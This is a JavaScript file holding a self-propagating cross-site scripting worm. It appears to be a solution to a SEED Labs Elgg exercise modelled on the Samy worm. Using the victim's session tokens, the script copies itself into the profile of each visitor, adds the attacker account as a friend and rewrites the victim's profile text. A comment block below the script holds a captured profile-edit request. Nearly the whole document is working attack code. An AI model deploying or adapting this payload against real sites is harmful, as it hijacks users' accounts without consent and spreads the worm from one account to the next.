<script id="worm">
    window.onload = function(){

        var headerTag = "<script id=\"worm\" type=\"text/javascript\">"; 
        var jsCode = document.getElementById("worm").innerHTML;
        var tailTag = "</" + "script>";
        var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

        var userName="&name="+elgg.session.user.name;
        var guid="&guid="+elgg.session.user.guid;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
        var Ajax=null;

        //propagate code via http edit to the user's description
        var content= token+ts+userName + "&description=" + wormCode + "&" +
        "accesslevel[description]=2" + guid; //FILL IN
        var samyGuid=59; //FILL IN
        var sendurl="http://www.seed-server.com/action/profile/edit"; //FILL IN

        //send worm code to user via the profile edit.
        if(elgg.session.user.guid!=samyGuid)
        {
            //Create and send Ajax request to modify profile
            Ajax = null;
            Ajax=new XMLHttpRequest();
            Ajax.open("POST", sendurl, true);
            Ajax.setRequestHeader("Content-Type",
            "application/x-www-form-urlencoded");
            Ajax.send(content);
        }

        //add samy as friend on the victim's account
        var sendurl="http://www.seed-server.com/action/friends/add?friend=59"+ts+token;
       
        //create and send request
        Ajax=new XMLHttpRequest();
        Ajax.open("GET", sendurl, true);
        Ajax.send();

        //edit victim's account
        var content= token+ts+userName + "&briefdescription=<p>I am Samy's biggest fan</p>&" +
        "accesslevel[description]=2" + guid; //FILL IN
        var sendurl="http://www.seed-server.com/action/profile/edit"; //FILL IN

        //create and send request
        if(elgg.session.user.guid!=samyGuid)
        {
            //Create and send Ajax request to modify profile
            var Ajax=null;
            Ajax=new XMLHttpRequest();
            Ajax.open("POST", sendurl, true);
            Ajax.setRequestHeader("Content-Type",
            "application/x-www-form-urlencoded");
            Ajax.send(content);
        }
    }

</script>





/*

http://www.seed-server.com/action/profile/edit
__elgg_token=YviMIk7momYYyCQU3S48pQ&
__elgg_ts=1677340891&
name=Alice&description=<p>I am Alice</p> &
accesslevel[description]=2&
briefdescription=Yo, it's ALIIIICCCEEE&accesslevel[briefdescription]=2&
location=&
accesslevel[location]=2&
interests=&
accesslevel[interests]=2&
skills=&
accesslevel[skills]=2&
contactemail=&
accesslevel[contactemail]=2&
phone=&
accesslevel[phone]=2&
mobile=&
accesslevel[mobile]=2&
website=&
accesslevel[website]=2&
twitter=&
accesslevel[twitter]=2&
guid=56

*/